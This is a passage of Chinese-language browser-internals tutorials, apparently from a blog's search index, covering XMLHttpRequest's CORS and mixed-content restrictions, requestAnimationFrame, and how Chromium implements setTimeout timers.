id=\"XMLHttpRequest使用过程中的“坑”\"><a href=\"#XMLHttpRequest使用过程中的“坑”\" class=\"headerlink\" title=\"XMLHttpRequest使用过程中的“坑”\"></a>XMLHttpRequest 使用过程中的 “坑”</h2><p>上述过程看似简单，但由于浏览器很多安全策略的限制，所以会导致你在使用过程中踩到非常多的 “坑”。</p>\n<p>浏览器安全问题是前端工程师避不开的一道坎，通常在使用过程中遇到的 “坑”，很大一部分都是由安全策略引起的，不管你喜不喜欢，它都在这里。本来很完美的一个方案，正是由于加了安全限制，导致使用起来非常麻烦。</p>\n<p>而你要做的就是去正视这各种的安全问题。也就是说要想更加完美地使用 XMLHttpRequest，你就要了解浏览器的安全策略。</p>\n<p>下面我们就来看看在使用 XMLHttpRequest 的过程中所遇到的跨域问题和混合内容问题。</p>\n<h3 id=\"1-跨域问题\"><a href=\"#1-跨域问题\" class=\"headerlink\" title=\"1. 跨域问题\"></a>1. 跨域问题</h3><p>比如在极客邦的官网使用 XMLHttpRequest 请求极客时间的页面内容，由于极客邦的官网是 <code>www.geekbang.org</code>，极客时间的官网是 <code>time.geekbang.org</code>，它们不是同一个源，所以就涉及到了跨域（在 A 站点中去访问不同源的 B 站点的内容）。默认情况下，跨域请求是不被允许的，你可以看下面的示例代码：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> xhr = <span class=\"keyword\">new</span> <span class=\"title class_\">XMLHttpRequest</span>()</span><br><span class=\"line\"><span class=\"keyword\">var</span> url = <span class=\"string\">'https://time.geekbang.org/'</span></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">handler</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">    <span class=\"keyword\">switch</span>(xhr.<span class=\"property\">readyState</span>){</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">0</span>: <span class=\"comment\">//请求未初始化</span></span><br><span class=\"line\">        <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"请求未初始化\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">1</span>:<span class=\"comment\">//OPENED</span></span><br><span class=\"line\">        <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"OPENED\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">2</span>:<span class=\"comment\">//HEADERS_RECEIVED</span></span><br><span class=\"line\">        <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"HEADERS_RECEIVED\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">3</span>:<span class=\"comment\">//LOADING  </span></span><br><span class=\"line\">        <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"LOADING\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">4</span>:<span class=\"comment\">//DONE</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"variable language_\">this</span>.<span class=\"property\">status</span> == <span class=\"number\">200</span>||<span class=\"variable language_\">this</span>.<span class=\"property\">status</span> == <span class=\"number\">304</span>){</span><br><span class=\"line\">            <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"variable language_\">this</span>.<span class=\"property\">responseText</span>);</span><br><span class=\"line\">            }</span><br><span class=\"line\">        <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"DONE\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br><span class=\"line\">   </span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">callOtherDomain</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(xhr) {    </span><br><span class=\"line\">    xhr.<span class=\"title function_\">open</span>(<span class=\"string\">'GET'</span>, url, <span class=\"literal\">true</span>)</span><br><span class=\"line\">    xhr.<span class=\"property\">onreadystatechange</span> = handler</span><br><span class=\"line\">    xhr.<span class=\"title function_\">send</span>();</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"title function_\">callOtherDomain</span>()</span><br></pre></td></tr></tbody></table></figure>\n\n<p>你可以在控制台测试下。首先通过浏览器打开 <code>www.geekbang.org</code>，然后打开控制台，在控制台输入以上示例代码，再执行，会看到请求被 Block 了。控制台的提示信息如下：</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">Access to XMLHttpRequest at 'https://time.geekbang.org/' from origin 'https://www.geekbang.org' has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present on the requested resource.</span><br></pre></td></tr></tbody></table></figure>\n\n<p>因为 <code>www.geekbang.org</code> 和 <code>time.geekbang.com</code> 不属于一个域，所以以上访问就属于跨域访问了，这次访问失败就是由于跨域问题导致的。</p>\n<h3 id=\"2-HTTPS混合内容的问题\"><a href=\"#2-HTTPS混合内容的问题\" class=\"headerlink\" title=\"2. HTTPS混合内容的问题\"></a>2. HTTPS 混合内容的问题</h3><p>了解完跨域问题后，我们再来看看 HTTPS 的混合内容。HTTPS 混合内容是 HTTPS 页面中包含了不符合 HTTPS 安全要求的内容，比如包含了 HTTP 资源，通过 HTTP 加载的图像、视频、样式表、脚本等，都属于混合内容。</p>\n<p>通常，如果 HTTPS 请求页面中使用混合内容，浏览器会针对 HTTPS 混合内容显示警告，用来向用户表明此 HTTPS 页面包含不安全的资源。比如打开站点 <code>https://www.iteye.com/groups</code>，可以通过控制台看到混合内容的警告，参考下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/663893380ea9cb14035f9458.png\" alt=\"HTTPS混合内容警告\"></p>\n<p>从上图可以看出，通过 HTML 文件加载的混合资源，虽然给出警告，但大部分类型还是能加载的。而使用 XMLHttpRequest 请求时，浏览器认为这种请求可能是攻击者发起的，会阻止此类危险的请求。比如我通过浏览器打开地址 <code>https://www.iteye.com/groups</code>，然后通过控制台，使用 XMLHttpRequest 来请求 <code>http://img-ads.csdn.net/2018/201811150919211586.jpg</code>，这时候请求就会报错，出错信息如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/663893650ea9cb14035fedea.png\" alt=\"使用XMLHttpRequest混合资源失效\"></p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>好了，今天我们就讲到这里，下面我来总结下今天的内容。</p>\n<p>首先我们介绍了回调函数和系统调用栈；接下来我们站在循环系统的视角，分析了 XMLHttpRequest 是怎么工作的；最后又说明了由于一些安全因素的限制，在使用 XMLHttpRequest 的过程中会遇到跨域问题和混合内容的问题。</p>\n<p>本篇文章跨度比较大，不是单纯地讲一个问题，而是将回调类型、循环系统、网络请求和安全问题 “串联” 起来了。</p>\n<p>对比<a href=\"/browser/pageEventLoop/setTimeout.html\">上一篇文章</a>，<code>setTimeout</code> 是直接将延迟任务添加到延迟队列中，而 XMLHttpRequest 发起请求，是由浏览器的其他进程或者线程去执行，然后再将执行结果利用 IPC 的方式通知渲染进程，之后渲染进程再将对应的消息添加到消息队列中。如果你搞懂了 <code>setTimeout</code> 和 XMLHttpRequest 的工作机制后，再来理解其他 WebAPI 就会轻松很多了，因为大部分 WebAPI 的工作逻辑都是类似的。</p>\n"},{"title":"浏览器中的页面循环系统","url":"/browser/pageEventLoop/index.html","content":"<p><a href=\"/browser/pageEventLoop/MessageQueuesAndEventLoop.html\">01. 消息队列和事件循环：页面是怎么 “活” 起来的？</a><br><a href=\"/browser/pageEventLoop/setTimeout.html\">02. WebAPI：setTimeout 是如何实现的？</a><br><a href=\"/browser/pageEventLoop/requestAnimationFrame.html\">03. WebAPI：requestAnimationFrame 的工作机制</a><br><a href=\"/browser/pageEventLoop/XMLHttpRequest.html\">04. WebAPI：XMLHttpRequest 是如何实现的？</a><br><a href=\"/browser/pageEventLoop/MacroAndMicroTasks.html\">05. 宏任务和微任务：不是所有任务都是一个待遇</a><br><a href=\"/browser/pageEventLoop/PromiseXFetch.html\">06. Promise：使用 Promise，告别回调函数</a><br><a href=\"/browser/pageEventLoop/AsyncAwait.html\">07. async/await：使用同步的方式去写异步代码</a><br><a href=\"/browser/pageEventLoop/TaskSchedule.html\">08. 任务调度：有了 setTimeOut，为什么还要使用 rAF？</a></p>\n"},{"title":"WebAPI：requestAnimationFrame 的工作机制","url":"/browser/pageEventLoop/requestAnimationFrame.html","content":"<p><code>requestAnimationFrame</code> 是一个由浏览器提供的 API，用于请求在下一次重绘之前调用指定的回调函数，以执行动画或任何一类的框架更新。这个 API 主要用于创建平滑的动画效果，因为它允许浏览器优化动画的运行，减少重绘和重排的次数，并在合适的时机为动画帧执行回调，从而达到更流畅的视觉效果。</p>\n<h2 id=\"工作机制\"><a href=\"#工作机制\" class=\"headerlink\" title=\"工作机制\"></a>工作机制</h2><p><code>requestAnimationFrame</code> 的工作机制可以总结如下：</p>\n<ol>\n<li><p><strong>帧率控制</strong>：<br><code>requestAnimationFrame</code> 通常以浏览器的刷新率运行，大多数现代显示器有 60Hz 的刷新率，因此它尝试以大约 60 次每秒（60 FPS）的速度运行回调函数。</p>\n</li>\n<li><p><strong>可视性优化</strong>：<br>当运行在一个非激活的标签页或不可见的 <code>iframe</code> 中时，<code>requestAnimationFrame</code> 会暂停调用回调函数，从而节省 CPU 和电池。</p>\n</li>\n<li><p><strong>合成器线程（Compositor Thread）</strong>：<br>现代浏览器使用多线程来把页面绘制工作分摊给合成器线程。这意味着对于某些改变不涉及布局的样式（如 <code>transform</code> 和 <code>opacity</code>），<code>requestAnimationFrame</code> 可以在不阻塞主线程的情况下更新动画。</p>\n</li>\n<li><p><strong>协同帧延</strong>：<br><code>requestAnimationFrame</code> 确保在浏览器重绘之前执行回调，这样可以减少由于 JavaScript 运行时间过长而错过帧的情况，所以说它是与浏览器重绘过程协同工作的。</p>\n</li>\n</ol>\n<h2 id=\"用法\"><a href=\"#用法\" class=\"headerlink\" title=\"用法\"></a>用法</h2><p>使用 <code>requestAnimationFrame</code> 时，需要给它传递一个回调函数，浏览器将在下一次重绘前调用该函数。回调函数会接收一个时间戳参数，该时间戳表示请求重绘的时间点。</p>\n<h2 id=\"代码示例\"><a href=\"#代码示例\" class=\"headerlink\" title=\"代码示例\"></a>代码示例</h2><p>下面的代码示例展示了如何使用 <code>requestAnimationFrame</code> 创建一个简单的动画效果。</p>\n<figure class=\"highlight javascript\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">animate</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">  <span class=\"comment\">// 更新动画状态</span></span><br><span class=\"line\">  <span class=\"comment\">// ...</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 计算下一帧的动画状态</span></span><br><span class=\"line\">  <span class=\"comment\">// ...</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 继续请求下一帧</span></span><br><span class=\"line\">  <span class=\"title function_\">requestAnimationFrame</span>(animate);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 启动动画循环</span></span><br><span class=\"line\"><span class=\"title function_\">requestAnimationFrame</span>(animate);</span><br></pre></td></tr></tbody></table></figure>\n\n<h2 id=\"取消请求\"><a href=\"#取消请求\" class=\"headerlink\" title=\"取消请求\"></a>取消请求</h2><p>如果需要取消动画，可能是因为动画已经完成或用户界面发生变化，可以使用 <code>cancelAnimationFrame</code> 来取消之前的请求。</p>\n<figure class=\"highlight javascript\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> requestId = <span class=\"title function_\">requestAnimationFrame</span>(animate);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 取消</span></span><br><span class=\"line\"><span class=\"title function_\">cancelAnimationFrame</span>(requestId);</span><br></pre></td></tr></tbody></table></figure>\n\n<h2 id=\"执行顺序\"><a href=\"#执行顺序\" class=\"headerlink\" title=\"执行顺序\"></a>执行顺序</h2><p><code>requestAnimationFrame</code> 回调的执行顺序是在浏览器重绘之前，这就意味着浏览器可以批量处理绘制操作，这通常优于使用 <code>setTimeout</code> 或 <code>setInterval</code>，后者不能保证回调函数的执行会紧贴浏览器的重绘周期。</p>\n<h2 id=\"与setTimeout的区别\"><a href=\"#与setTimeout的区别\" class=\"headerlink\" title=\"与setTimeout的区别\"></a>与 setTimeout 的区别</h2><p><code>requestAnimationFrame</code> (rAF) 和 <code>setTimeout</code> 是用于在 JavaScript 中调度任务的两种不同的方法，它们在使用目的和工作机制上有明显的差异。以下是这两种方法的主要区别：</p>\n<h3 id=\"目的\"><a href=\"#目的\" class=\"headerlink\" title=\"目的\"></a>目的</h3><ul>\n<li><strong>requestAnimationFrame</strong>：专为动画和帧更新设计，保证回调函数在浏览器重绘之前执行。这意味着动画在可视效果上更加平滑，因为它们与浏览器的帧率同步。</li>\n<li><strong>setTimeout</strong>：用于在指定的延迟后执行一次回调函数。它不特别为动画设计，而是一种通用的方法来延迟任务的执行。</li>\n</ul>\n<h3 id=\"帧控制\"><a href=\"#帧控制\" class=\"headerlink\" title=\"帧控制\"></a>帧控制</h3><ul>\n<li><strong>requestAnimationFrame</strong>：尝试以浏览器的帧率运行，通常是 60 帧每秒（60FPS），但会自动调整以匹配显示器的刷新率或运行环境的性能。</li>\n<li><strong>setTimeout</strong>：简单地在指定的延迟后执行，不与浏览器的绘制过程同步，可能会导致动画出现跳帧或不平滑的现象。</li>\n</ul>\n<h3 id=\"性能和效率\"><a href=\"#性能和效率\" class=\"headerlink\" title=\"性能和效率\"></a>性能和效率</h3><ul>\n<li><strong>requestAnimationFrame</strong>：更高效，因为它能确保回调函数在正确的时间被调用，避免不必要的处理和重绘，从而减少资源消耗和提升性能。</li>\n<li><strong>setTimeout</strong>：可能因为计时不精准导致性能问题，尤其是当设置的延时小于浏览器的最小延时限制时，或者当回调函数的执行跟浏览器的绘制周期不同步时。</li>\n</ul>\n<h3 id=\"精度\"><a href=\"#精度\" class=\"headerlink\" title=\"精度\"></a>精度</h3><ul>\n<li><strong>requestAnimationFrame</strong>: 提供了与浏览器重绘过程同步的精确时机，可以接收一个精确到毫秒的时间戳参数，这对于动画和视觉效果的平滑性至关重要。</li>\n<li><strong>setTimeout</strong>: 延时的精度受到 JavaScript 事件循环和浏览器最小延时设置 (通常～4ms) 的影响，而且可能会受到其他任务和系统负载的影响。</li>\n</ul>\n<h3 id=\"使用场景\"><a href=\"#使用场景\" class=\"headerlink\" title=\"使用场景\"></a>使用场景</h3><ul>\n<li><strong>requestAnimationFrame</strong>：适合需要高频更新并与浏览器渲染周期同步的场景，如动画、页面滚动效果等。</li>\n<li><strong>setTimeout</strong>：适合不需要与浏览器绘制周期同步的一般延时任务，例如延迟消息提示、延时请求等。</li>\n</ul>\n<h3 id=\"取消机制\"><a href=\"#取消机制\" class=\"headerlink\" title=\"取消机制\"></a>取消机制</h3><ul>\n<li><strong>requestAnimationFrame</strong>：使用 <code>cancelAnimationFrame</code> 来取消已经调度的回调。</li>\n<li><strong>setTimeout</strong>：使用 <code>clearTimeout</code> 来取消已经调度的回调。</li>\n</ul>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>总的来说，<code>requestAnimationFrame</code> 提供了一种浏览器优化的方法来执行动画和绘制操作，使其能够尽可能平滑并减少页面卡顿的现象。与之前的定时器函数相比（如 <code>setTimeout</code> 和 <code>setInterval</code>），<code>requestAnimationFrame</code> 更适合进行动画绘制，因为它可以根据浏览器的绘制能力智能调整执行频率，避免不必要的性能开销，并且更好地与浏览器渲染流程集成。</p>\n"},{"title":"WebAPI：setTimeout 是如何实现的？","url":"/browser/pageEventLoop/setTimeout.html","content":"<p>本篇文章主要介绍的是 setTimeout。其实说起 setTimeout 方法，从事开发的同学想必都不会陌生，它就是一个定时器，用来指定某个函数在多少毫秒之后执行。它会返回一个整数，表示定时器的编号，同时你还可以通过该编号来取消这个定时器。下面的示例代码就演示了定时器最基础的使用方式：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">showName</span>(<span class=\"params\"></span>){</span><br><span class=\"line\">  <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"极客时间\"</span>)</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"keyword\">var</span> timerID = <span class=\"built_in\">setTimeout</span>(showName,<span class=\"number\">200</span>);</span><br></pre></td></tr></tbody></table></figure>\n\n<p>执行上述代码，输出的结果也很明显，通过 setTimeout 指定在 200 毫秒之后调用 showName 函数，并输出 “极客时间” 四个字。</p>\n<p>简单了解了 setTimeout 的使用方法后，那接下来我们就来看看浏览器是如何实现定时器的，然后再介绍下定时器在使用过程中的一些注意事项。</p>\n<h2 id=\"浏览器怎么实现setTimeout\"><a href=\"#浏览器怎么实现setTimeout\" class=\"headerlink\" title=\"浏览器怎么实现setTimeout\"></a>浏览器怎么实现 setTimeout</h2><p>要了解定时器的工作原理，就得先来回顾下之前讲的事件循环系统，我们知道渲染进程中所有运行在主线程上的任务都需要先添加到消息队列，然后事件循环系统再按照顺序执行消息队列中的任务。下面我们来看看那些典型的事件：</p>\n<ul>\n<li>当接收到 HTML 文档数据，渲染引擎就会将 “解析 DOM” 事件添加到消息队列中，</li>\n<li>当用户改变了 Web 页面的窗口大小，渲染引擎就会将 “重新布局” 的事件添加到消息队列中。</li>\n<li>当触发了 JavaScript 引擎垃圾回收机制，渲染引擎会将 “垃圾回收” 任务添加到消息队列中。</li>\n<li>同样，如果要执行一段异步 JavaScript 代码，也是需要将执行任务添加到消息队列中。</li>\n</ul>\n<p>以上列举的只是一小部分事件，这些事件被添加到消息队列之后，事件循环系统就会按照消息队列中的顺序来执行事件。</p>\n<p>所以说要执行一段异步任务，需要先将任务添加到消息队列中。不过通过定时器设置回调函数有点特别，它们需要在指定的时间间隔内被调用，但消息队列中的任务是按照顺序执行的，所以为了保证回调函数能在指定时间内执行，你不能将定时器的回调函数直接添加到消息队列中。</p>\n<p>那么该怎么设计才能让定时器设置的回调事件在规定时间内被执行呢？你也可以思考下，如果让你在消息循环系统的基础之上加上定时器的功能，你会如何设计？</p>\n<p>在 Chrome 中除了正常使用的消息队列之外，还有另外一个消息队列，这个队列中维护了需要延迟执行的任务列表，包括了定时器和 Chromium 内部一些需要延迟执行的任务。所以当通过 JavaScript 创建一个定时器时，渲染进程会将该定时器的回调任务添加到延迟队列中。</p>\n<p>如果感兴趣，你可以参考<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2Nocm9taXVtL2Nocm9taXVtL2Jsb2IvbWFpbi9iYXNlL3Rhc2svc2VxdWVuY2VfbWFuYWdlci90YXNrX3F1ZXVlX2ltcGwuaA==\"> Chromium 中关于队列部分的源码<i class=\"fa fa-external-link-alt\"></i></span>。</p>\n<p>源码中延迟执行队列的定义如下所示：</p>\n<figure class=\"highlight c++\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">DelayedIncomingQueue delayed_incoming_queue;</span><br></pre></td></tr></tbody></table></figure>\n\n<p>当通过 JavaScript 调用 setTimeout 设置回调函数的时候，渲染进程将会创建一个回调任务，包含了回调函数 showName、当前发起时间、延迟执行时间，其模拟代码如下所示：</p>\n<figure class=\"highlight c++\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">DelayTask</span>{</span><br><span class=\"line\">  int64 id；</span><br><span class=\"line\">  CallBackFunction cbf;</span><br><span class=\"line\">  <span class=\"type\">int</span> start_time;</span><br><span class=\"line\">  <span class=\"type\">int</span> delay_time;</span><br><span class=\"line\">};</span><br><span class=\"line\">DelayTask timerTask;</span><br><span class=\"line\">timerTask.cbf = showName;</span><br><span class=\"line\">timerTask.start_time = <span class=\"built_in\">getCurrentTime</span>(); <span class=\"comment\">//获取当前时间</span></span><br><span class=\"line\">timerTask.delay_time = <span class=\"number\">200</span>;<span class=\"comment\">//设置延迟执行时间</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>创建好回调任务之后，再将该任务添加到延迟执行队列中，代码如下所示：</p>\n<figure class=\"highlight c++\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">delayed_incoming_queue.<span class=\"built_in\">push</span>(timerTask)；</span><br></pre></td></tr></tbody></table></figure>\n\n<p>现在通过定时器发起的任务就被保存到延迟队列中了，那接下来我们再来看看消息循环系统是怎么触发延迟队列的。</p>\n<p>我们可以来完善上一篇文章中消息循环的代码，在其中加入执行延迟队列的代码，如下所示：</p>\n<figure class=\"highlight c++\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">ProcessTimerTask</span><span class=\"params\">()</span></span>{</span><br><span class=\"line\">  <span class=\"comment\">//从delayed_incoming_queue中取出已经到期的定时器任务</span></span><br><span class=\"line\">  <span class=\"comment\">//依次执行这些任务</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">TaskQueue task_queue；</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">ProcessTask</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\"><span class=\"type\">bool</span> keep_running = <span class=\"literal\">true</span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">MainTherad</span><span class=\"params\">()</span></span>{</span><br><span class=\"line\">  <span class=\"keyword\">for</span>(;;){</span><br><span class=\"line\">    <span class=\"comment\">//执行消息队列中的任务</span></span><br><span class=\"line\">    Task task = task_queue.<span class=\"built_in\">takeTask</span>();</span><br><span class=\"line\">    <span class=\"built_in\">ProcessTask</span>(task);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">//执行延迟队列中的任务</span></span><br><span class=\"line\">    <span class=\"built_in\">ProcessDelayTask</span>()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!keep_running) <span class=\"comment\">//如果设置了退出标志，那么直接退出线程循环</span></span><br><span class=\"line\">        <span class=\"keyword\">break</span>; </span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n\n<p>从上面代码可以看出来，我们添加了一个 ProcessDelayTask 函数，该函数是专门用来处理延迟执行任务的。这里我们要重点关注它的执行时机，在上段代码中，处理完消息队列中的一个任务之后，就开始执行 ProcessDelayTask 函数。ProcessDelayTask 函数会根据发起时间和延迟时间计算出到期的任务，然后依次执行这些到期的任务。等到期的任务执行完成之后，再继续下一个循环过程。通过这样的方式，一个完整的定时器就实现了。</p>\n<p>设置一个定时器，JavaScript 引擎会返回一个定时器的 ID。那通常情况下，当一个定时器的任务还没有被执行的时候，也是可以取消的，具体方法是调用 clearTimeout 函数，并传入需要取消的定时器的 ID。如下面代码所示：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timer_id)</span><br></pre></td></tr></tbody></table></figure>\n\n<p>其实浏览器内部实现取消定时器的操作也是非常简单的，就是直接从 delayed_incoming_queue 延迟队列中，通过 ID 查找到对应的任务，然后再将其从队列中删除掉就可以了。</p>\n<h2 id=\"使用setTimeout的一些注意事项\"><a href=\"#使用setTimeout的一些注意事项\" class=\"headerlink\" title=\"使用setTimeout的一些注意事项\"></a>使用 setTimeout 的一些注意事项</h2><p>现在你应该知道在浏览器内部定时器是如何工作的了。不过在使用定时器的过程中，如果你不了解定时器的一些细节，那么很有可能掉进定时器的一些陷阱里。所以接下来，我们就来讲解一下在使用定时器过程中存在的那些陷阱。</p>\n<h3 id=\"1-如果当前任务执行时间过久，会影响定时器任务的执行\"><a href=\"#1-如果当前任务执行时间过久，会影响定时器任务的执行\" class=\"headerlink\" title=\"1. 如果当前任务执行时间过久，会影响定时器任务的执行\"></a>1. 如果当前任务执行时间过久，会影响定时器任务的执行</h3><p>在使用 setTimeout 的时候，有很多因素会导致回调函数执行比设定的预期值要久，其中一个就是当前任务执行时间过久从而导致定时器设置的任务被延后执行。我们先看下面这段代码：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">bar</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'bar'</span>)</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">foo</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">    <span class=\"built_in\">setTimeout</span>(bar, <span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">5000</span>; i++) {</span><br><span class=\"line\">        <span class=\"keyword\">let</span> i = <span class=\"number\">5</span>+<span class=\"number\">8</span>+<span class=\"number\">8</span>+<span class=\"number\">8</span></span><br><span class=\"line\">        <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(i)</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"title function_\">foo</span>()</span><br></pre></td></tr></tbody></table></figure>\n\n<p>这段代码中，在执行 foo 函数的时候使用 setTimeout 设置了一个 0 延时的回调任务，设置好回调任务后，foo 函数会继续执行 5000 次 for 循环。</p>\n<p>通过 setTimeout 设置的回调任务被放入了消息队列中并且等待下一次执行，这里并不是立即执行的；要执行消息队列中的下个任务，需要等待当前的任务执行完成，由于当前这段代码要执行 5000 次的 for 循环，所以当前这个任务的执行时间会比较久一点。这势必会影响到下个任务的执行时间。</p>\n<p>你也可以打开 Performance 来看看其执行过程，如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/66387cdf0ea9cb140329bdad.png\" alt=\"长任务导致定时器被延后执行\"></p>\n<p>从图中可以看到，执行 foo 函数所消耗的时长是 500 毫秒，这也就意味着通过 setTimeout 设置的任务会被推迟到 500 毫秒以后再去执行，而设置 setTimeout 的回调延迟时间是 0。</p>\n<h3 id=\"2-如果setTimeout存在嵌套调用，那么系统会设置最短时间间隔为4毫秒\"><a href=\"#2-如果setTimeout存在嵌套调用，那么系统会设置最短时间间隔为4毫秒\" class=\"headerlink\" title=\"2. 如果setTimeout存在嵌套调用，那么系统会设置最短时间间隔为4毫秒\"></a>2. 如果 setTimeout 存在嵌套调用，那么系统会设置最短时间间隔为 4 毫秒</h3><p>也就是说在定时器函数里面嵌套调用定时器，也会延长定时器的执行时间，可以先看下面的这段代码：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">cb</span>(<span class=\"params\"></span>) { <span class=\"built_in\">setTimeout</span>(cb, <span class=\"number\">0</span>); }</span><br><span class=\"line\"><span class=\"built_in\">setTimeout</span>(cb, <span class=\"number\">0</span>);</span><br></pre></td></tr></tbody></table></figure>\n\n<p>上述这段代码你有没有看出存在什么问题？</p>\n<p>你还是可以通过 Performance 来记录下这段代码的执行过程，如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/66387d1d0ea9cb14032a6257.png\" alt=\"循环嵌套调用setTimeout\"></p>\n<p>上图中的竖线就是定时器的函数回调过程，从图中可以看出，前面五次调用的时间间隔比较小，嵌套调用超过五次以上，后面每次的调用最小时间间隔是 4 毫秒。之所以出现这样的情况，是因为在 Chrome 中，定时器被嵌套调用 5 次以上，系统会判断该函数方法被阻塞了，如果定时器的调用时间间隔小于 4 毫秒，那么浏览器会将每次调用的时间间隔设置为 4 毫秒。下面是 Chromium 实现 4 毫秒延迟的代码，你可以看下：</p>\n<figure class=\"highlight c++\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">const</span> <span class=\"type\">int</span> kMaxTimerNestingLevel = <span class=\"number\">5</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Chromium uses a minimum timer interval of 4ms. We'd like to go</span></span><br><span class=\"line\"><span class=\"comment\">// lower; however, there are poorly coded websites out there which do</span></span><br><span class=\"line\"><span class=\"comment\">// create CPU-spinning loops.  Using 4ms prevents the CPU from</span></span><br><span class=\"line\"><span class=\"comment\">// spinning too busily and provides a balance between CPU spinning and</span></span><br><span class=\"line\"><span class=\"comment\">// the smallest possible interval timer.</span></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">constexpr</span> base::TimeDelta kMinimumInterval = base::TimeDelta::<span class=\"built_in\">FromMilliseconds</span>(<span class=\"number\">4</span>);</span><br></pre></td></tr></tbody></table></figure>\n\n<figure class=\"highlight c++\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">base::TimeDelta interval_milliseconds =</span><br><span class=\"line\">      std::<span class=\"built_in\">max</span>(base::TimeDelta::<span class=\"built_in\">FromMilliseconds</span>(<span class=\"number\">1</span>), interval);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (interval_milliseconds &lt; kMinimumInterval &amp;&amp;</span><br><span class=\"line\">      nesting_level_ &gt;= 